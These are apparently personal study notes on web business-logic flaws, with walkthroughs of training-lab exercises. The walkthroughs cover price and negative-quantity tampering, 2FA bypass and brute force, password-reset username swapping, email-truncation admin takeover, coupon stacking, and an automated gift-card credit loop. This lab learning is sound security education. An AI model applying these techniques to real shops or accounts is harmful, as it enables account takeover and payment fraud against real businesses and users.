	* Attacker Goal here to tamper with that input to anything different from application Logic like -> id=1 to id=1' or id=-1 or id=1+1 or id=.1  or id=whoami etc etc  
* If on that input no Server side validation , then good for Attacker
* use tools such as Burp Proxy and Repeater to try submitting unconventional values
* try input in ranges that legitimate users are unlikely to ever enter
* Includes exceptionally high or exceptionally low numeric inputs and abnormally long strings for text-based fields.
* even try unexpected data types


```By observing the application's response, you should try and answer the following questions:```

1. Are there any limits that are imposed on the data?
2. What happens when you reach those limits?
3. Is any transformation or normalization being performed on your input?

`Keep in mind that if you find one form on the target website that fails to safely handle unconventional input, it's likely that other forms will have the same issues.`


#### 3. Making flawed assumptions about user behavior =>

* Most common assumption of logic flaw
* May lead to serious issues

#### Examples =>

a.) Trusted users won't always remain trustworthy

b.) Users won't always supply mandatory input
	
	* In application, there can be many parameters, and as an attacker either manipulate or tamper with parameter to unusual things or can remove parameters to check application behavior or logic
	
	* Make sure to ->
	
		* Only remove one parameter at a time to ensure all relevant code paths are reached.
		* Try deleting the name of the parameter as well as the value. The server will typically handle both cases differently.
		* Follow multi-stage processes through to completion. Sometimes tampering with a parameter in one step will have an effect on another step further along in the workflow.
	
	* This applies to both URL and POST parameters, but don't forget to check the cookies too. This simple process can reveal some bizarre application behavior that may be exploitable.  
	* 

c.) Users won't always follow the intended sequence

```
Many transactions rely on predefined workflows consisting of a sequence of steps. The web interface will typically guide users through this process, taking them to the next step of the workflow each time they complete the current one. However, attackers won't necessarily adhere to this intended sequence. Failing to account for this possibility can lead to dangerous flaws that may be relatively simple to exploit.

```

```
Attacker can use burpsuite to forced browsing to perform any interactions with the server in any order they want.

```
```
Testing Example ->

you might skip certain steps, access a single step more than once, return to earlier steps, and so on
Take note of how different steps are accessed

```

#### 4. Domain-specific flaws =>

* We can encounter logic flaws that are specific to the business domain or the purpose of the site

* The discounting functionality of online shops is a classic attack surface when hunting for logic flaws. This can be a potential gold mine for an attacker, with all kinds of basic logic flaws occurring in the way discounts are applied. --- Mean discount offer

* Pay attention to any situation where prices or other sensitive values are adjusted based on criteria determined by user actions
* Try to understand what algorithms the application uses to make these adjustments and at what point these adjustments are made.
* To use a simple example, you need to understand social media to understand the benefits of forcing a large number of users to follow you.
* We should read as much documentation as possible and, where available, talk to subject-matter experts from the domain to get their insight. 


#### 5. Providing an encryption oracle =>

* Dangerous scenarios can occur when user-controllable input is encrypted and the resulting ciphertext is then made available to the user in some way
* This kind of input is sometimes known as an "encryption oracle"
* An attacker can use this input to encrypt arbitrary data using the correct algorithm and asymmetric key.
* This becomes dangerous when there are other user-controllable inputs in the application that expect data encrypted with the same algorithm. 
* In this case, an attacker could potentially use the encryption oracle to generate valid, encrypted input and then pass it into other sensitive functions.
* This issue can be compounded if there is another user-controllable input on the site that provides the reverse function. This would enable the attacker to decrypt other data to identify the expected structure. This saves them some of the work involved in creating their malicious data but is not necessarily required to craft a successful exploit.


======================================================================

### Labs Practice =>

#### 1. Excessive trust in client-side controls =>

* Goal -> Purchase an item for an unintended price - Lightweight l33t leather jacket
* So, i just login there and click on that product which need to purchase in low price
* Clicked on Add to card -> Check cart -> Saw there -> name,price,quantity,copuon,place order functionality
* I checked these requests going on -> 
	* POST /cart and all the parameters like productid,redir,quantity,price
	* POST /cart/coupon, and param -> csrf and coupon
	* POST /cart/checkout -> csrf param only
* Need to testing on /cart req and manipulate "price" parameter
* From productId=1&redir=PRODUCT&quantity=1&price=133700
* To productId=1&redir=PRODUCT&quantity=1&price=100
* And then refresh /cart page on browser
* I saw -> $1.00 there
* And done


#### 2.  2FA broken logic =>

* Goal -> access victim user - carlos
* Let's First understand the procedure of 2FA
* 2FA -> 2 Factor Authentication -> Email + Code
* That mean beside email address to login account it need code which sent to email to verify the user
* So , to testing , first do simple steps to understand the application behavior
* Like, just login with own email account and verify with given code in email 
* So, attacker's goal is get either skip this 2fa code verification part or get 2fa code on attacker's controlable domain
* So, now after analyzing application behavior, i saw following requests ->
	* One POST /login request -> csrf=TGa0OCjbc2CLKqEoxv1QbFsHy6PRznSs&username=wiener&password=peter
	* 2nd GET /login2 request ->  									Cookie: session=tfM6JTdTyNICAJMIrkwXxkFXmKA4Z0Z5; verify=wiener
	* 3rd POST /login2 request -> csrf=HbyIH6h47xRUYLurE6apsVEGt47sCG1O&mfa-code=1475
* All we need is to play with above requests
* 1st -> GET /login2 -> to change verify=wiener to verify=carlos
* 2nd -> POST /login -> enter username and password of attacker and enter then invalid 2fa code
* 3rd -> POST /login2 -> intercept it and send to intruder and brute force 2fa code and also set the verify=carlos



#### 3. High-level logic vulnerability =>

""" 

After play with this lab i learned about experiment with Price manipulation and business logic problem with this. This is superb. Lets see what I learned from this lab

"""



* First add Product Number 1  to cart
* Now Also add Product Number 2 to cart
* Now from burp history check both POST of Products and send to repeater
* All we need is to understand Price Calculation things
* Here is the parameters for both request ->
  * productId=2&redir=PRODUCT&quantity=1
  * productId=1&redir=PRODUCT&quantity=1

* Product 1 -> $1337.00 with Quantity 1
* Product 2 -> $11.13 with Quantity 1
* Total Price -> $1348.13 -> But we have $100 credit to purcase and Aim is to purchase these under $100
* Now lets play with Product 2 and check If [Negative Quantity allow or not ( - )]
* Yes it allowed and this is where business logic problem arise
* With Product 2 -> Quantity  1 to Quantity -120 -> make the price -> Total : $1.40
* Which is under $100 credit and thats it
* This is like -> $11.13 * -120 => $1335.6 and this is in - [negative] and now use calculation formula with + [positive] price of $1337 which makes it -> $1.40



#### 4. Low-level logic flaw =>



```Here while analyzing Price Manipulation experiment i understood following things```



* Add 2 Items as Product 1 and Product 2
* Parameters ->
  * productId=1&redir=PRODUCT&quantity=1
  * productId=4&redir=PRODUCT&quantity=1

* When i add -1 or -100 like that then Item removed from cart -> That mean (- Negative) quantity  work here
* So, might be something different Logic using behind
* When adding 100 to quantity like -> quantity=100 or quantity=121 -> this gave :
  
  * "Invalid parameter: quantity"
* So, all the fundamental of logics here to play with above quantity and make the Total Price -> Negative and then between $0 to $100 by playing with Intruder + Repeater
* So, what we need is to play with both Product's Quantity as -> -1 or -10 or -99 or -10 + 10,1,99,90 etc according to need base on response, to make Total Price as our need ->
  * $-2113413.12 [example] -> by giving -99 to quantity or sometimes giving null payloads to intruder
  * $21233[example] -> check if - or  +  what this do to Total Price
  * $1000 [example]
  * $412 [example]
  * $28.49 [example]

* By calculating such stuffs we can get the real value for us

* Not forget to Refresh cart page to keep an eye on Total Price and also need to remove product sometime to balance price and start fresh and repeat

  

`Below are the result for me `



* Total $28.49

* Jacket $1337.00                                                                          19406 <- Quantity
* Sarcastic $99.07                                                                        171635 <- Quantity





=======================================================================



#### 5. Inconsistent handling of exceptional input =>



Inconsistent handling  mean input will not handling the user input given long strings



* Lab task is we need to exploit  a flaw in registration link and we need access adminstrative

* Its mean there is admin page and we need to be admin for this task and for this we need to give long string on registration link

* Let's try to give long string on email -> need to make 200 string long like <long-string>@email -> this long-string must be 200

  * echo "aakash@ac8c1f881e1e444a807d446501d700e4.web-security-academy.net" | wc -c
    65

  * echo "aakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakasha" | wc -c
    200

  * Now -> echo "aakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakasha@ac8c1f881e1e444a807d446501d700e4.web-security-academy.net" | wc -c 

    258

* I register with username -> adidas1 and password -> pas and email -> aakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakasha@ac8c1f881e1e444a807d446501d700e4.web-security-academy.net

* I check email client and click the given link and account created and then i login with registerd username and password

* I checked in  my account ->

  * aakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakashaakasha@ac8c1f881e1e444a807d446501d700e4.web-security-academy.n

* This user -> dontwannacry.com can access admin account so this is our aim or target

* we need that account with our email and very long string with 255 characters ->

  * qwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwerqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwerty@dontwannacry.com.ac361f8b1f37d97d80360b1901b5008e.web-security-academy.net
  * So, here is upto ->.com -> total character is 255 and after that from ac36 to .net become -> 313 character. mean we need admin email "dontwannacry.com" to 255 mean last 'm' comes to 255th position and so we use our own email in last with using '.' and total become 313 characters and thus bypassed it and become admin

* register now with username=adidas2 and password=pas and that above email

* Admin now



I used this site too for calculate characters => "https://www.charactercountonline.com/"

========================================================================



#### 6. Inconsistent security controls =>



Security Control mean problem in Authentication Functionality - I guess

Lets break it



* First register their with normal account and check what functionality they have using
* After register and login -> Saw -> Change Email Functionality
* Lets try to change email to admin email like ->  anything-name-here@dontwannacry.com
* After doing this boom -> got admin access



=========================================================================



#### 7. Weak isolation on dual-use endpoint



* Flaw in user's Privilege Escalation base on input, Aim is to become admin
* First login with given creds
* Now check my-account to see what functionalities set by target
* Functionalities ->  1. change email & 2. change password
* I tried first to escalate change email functionalities by giving administrator@admin.com but no use
* 2nd I tried to escalate change password functionalities -> in repeater i remove "current password" and set username from wiener to administrator and yeah -> password change successfully
* Now login with administrator username and new password set by me



=========================================================================



#### 8. Password reset broken logic =>



* Password reset come while login page there is option -> Forgot Password

* To understand Password reset logic of behind process first analyze it with own creds

* I gave my username in forgot password and check email

* https://acfb1fcc1fab72de808407fc009900b7.web-security-academy.net/forgot-password?temp-forgot-password-token=lLsNz6MQUTcqvGsHkVqhyw5K8Qmcdv3n

* I Opened that link and intercept request and do intercept requests to this host

* I saw "hidden" input ->

  *                        <input required type="hidden" name="csrf" value="gVix8TsZabDMiBpPW6YUMdgM6OaxcnhO">
                            <input required type=hidden name=temp-forgot-password-token value=lLsNz6MQUTcqvGsHkVqhyw5K8Qmcdv3n>
                            <input required type=hidden name=username value=wiener>

* So, it means we can reset password of victim by just changing username from wiener to victim name from value field
* Just set new password and intercept result
* Parameters ->
  * csrf=gVix8TsZabDMiBpPW6YUMdgM6OaxcnhO&temp-forgot-password-token=lLsNz6MQUTcqvGsHkVqhyw5K8Qmcdv3n&username=wiener&new-password-1=new&new-password-2=new
* And login with victim account with our given new password -> `csrf=gVix8TsZabDMiBpPW6YUMdgM6OaxcnhO&username=carlos&password=new`
* Done





#### 9. 2FA simple bypass =>



* 2FA mean 2 Factor Authentication mean even if we have victim username and password but it is not enough to take over account unless we know 2fa verification code which is sent to victim's either email or phone
* Before understanding victim account hacking just analyze own account first
* So, with our own creds given login, we got 4 digit verification code on our own email -> 0829
* So, our task is to bruteforce it ? No, this time there is another logic flaw here
* I saw with our own given creds when it goes to /login2 page but what i did is changed it to /my-account and hence it bypass the /login2 pagw which have page about inputting 2fa code.
* Mean now i have no need to use 2fa code
* Now lets do same process with given victim creds
* Done



``````
What I learn from this challenge lab, is attacker doesn't need to follow steps as given by target, attacker can directly jump to another process of attacker's choice
``````



#### 10. Insufficient workflow validation =>



* workflow validation mean the process target using to do specific task in specific manner
* But attacker can do experiment with these process , like either skipping process or do different process
* In this challenge or lab,1st analyze different product to see what steps it using order a product complete
* /cart/order-confirmation?order-confirmed=true ==> this is for success order 
* /cart?err=INSUFFICIENT_FUNDS ===> this is for unsuccess order
* So, from this Request ->
  * POST /cart/checkout
    * Response -> 
      * HTTP/1.1 303 See Other
        Location: /cart?err=INSUFFICIENT_FUNDS
* Now, just change the Response in Location Header from 
  * /cart?err=INSUFFICIENT_FUNDS   to
  * /cart/order-confirmation?order-confirmed=true 

* Done



#### 11. Authentication bypass via flawed state machine =>



* Sequence in login process, so analyze it and try to find flaw in this sequence
* login page -> csrf=<token>&username=wiener&password=peter
* then it going to -> /role-selector in Location
* There -> User & Content Author
* Post /role-selector -> role=user&csrf=2KsZdaDGxWguwVa0sMYtruprvtErqifo
* Ok, now i see there is no administration role, so we need to be admin
* From login process , when it redirect to /role-selector -> just change it to -> /admin and DONE



`So, here we skip the role process and tried to access admin page directly after that`



#### 12. Flawed enforcement of business rules =>



`Flaw in Purchasing workflow`



* I saw on top Coupon -> NEWCUST5

* And in bottom -> Sign up to our newsletter

* I made a@a.com -> PopUP comes -> Use coupon SIGNUP30 at checkout!

* Another coupon -> SIGNUP30

* So, 2 Copuons got -> SIGNUP30 & NEWCUST5

* Now lets pruchase Leather jacker product and use both coupons

* After applying both coupon ->

  * | Code     | Reduction |
    | -------- | --------- |
    | SIGNUP30 | -$401.10  |
    | NEWCUST5 | -$5.00    |

    | Total: | $930.90 |
    | ------ | ------- |
    |        |         |

* But, lets use these coupons again

* When I try to use SIGNUP30 code again then it applied successfully but it was applied after NEWCUST5

* But when apply same code twice -> Coupon already applied

* But using these 2 codes as alternate then it working sucessfully

* Now use these and purchase things 

* It becomes ->

  * | Code     | Reduction |
    | -------- | --------- |
    | SIGNUP30 | -$401.10  |
    | NEWCUST5 | -$5.00    |
    | SIGNUP30 | -$401.10  |
    | NEWCUST5 | -$5.00    |
    | SIGNUP30 | -$401.10  |
    | NEWCUST5 | -$5.00    |
    | SIGNUP30 | -$401.10  |

    | Total: | $0.00 |
    | ------ | ----- |
    |        |       |

* Good



#### 13. Infinite money logic flaw =>



* Again this have Sign up newsletter at bottom

* Use coupon SIGNUP30 at checkout! <-- PopUP came

* | Code     | Reduction |
  | -------- | --------- |
  | SIGNUP30 | -$401.10  |

  | Total: | $935.90 |
  | ------ | ------- |
  |        |         |

* From  My Account -> New Functionality -> Gift cards to gift card to anyone

* Another Product I seen -> Gift Card ->                         $10.00                        

* Let's purchase this Gift Card first and apply code SIGNUP30 ->

  * **Your order is on its way!**

    | Name                                                         | Price  | Quantity |      |
    | ------------------------------------------------------------ | ------ | -------- | ---- |
    | [Gift Card](https://ac831fc41eadc71c803006de00780010.web-security-academy.net/product?productId=2) | $10.00 | 1        |      |
    | SIGNUP30                                                     | -$3.00 |          |      |

    | Total: | $7.00 |
    | ------ | ----- |
    |        |       |

    **You have bought the following gift cards:**

    | Code       |
    | ---------- |
    | 4P0ShObgpt |

* We got gift cards code -> 4P0ShObgpt

* Now I try to use this code -> My Account Page -> Gift Cards -> 4P0ShObgpt -> Redeem

* This above process added **Store credit: $103.00**

* extra $3 added to store

* From History Burp -> POST /gift-card -> csrf=6qr8I4gysrw30KsSfhcPxRzYoie6UH3H&gift-card=4P0ShObgpt

* Now go to -> Burp's -> Project Options -> Sessions Handling Rule -> click on Add -> Their Scope -> URL Scope -> Include all URLs

* Now -> Details tab -> Rules Action -> click on Add -> Choose Run a Macro -> Under Select Macro -> Click ADD => Select the following things ->

  * POST /cart
    POST /cart/coupon
    POST /cart/checkout
    GET /cart/order-confirmation?order-confirmed=true
    POST /gift-card

* ![image-20201101100553098](/home/code/.config/Typora/typora-user-images/image-20201101100553098.png)





* Click OK
* In the list of requests, select `GET /cart/order-confirmation?order-confirmed=true`. Click "Configure item". In the dialog that opens, click "Add" to create a custom parameter. Name the parameter `gift-card` and highlight the gift card code at the bottom of the response. Click "OK" twice to go back to the Macro Editor.
* Select the `POST /gift-card` request and click "Configure item" again. In the "Parameter handling" section, use the drop-down menus to specify that the `gift-card` parameter should be derived from the prior response (response 4). Click "OK".
* In the Macro Editor, click "Test macro". Look at the response to `GET /cart/order-confirmation?order-confirmation=true` and note the gift card code that was generated. Look at the `POST /gift-card` request. Make sure that the `gift-card` parameter matches and confirm that it received a `302` response. Keep clicking "OK" until you get back to the main Burp window.
* 

## HTTP Host header attacks

## OAuth authentication
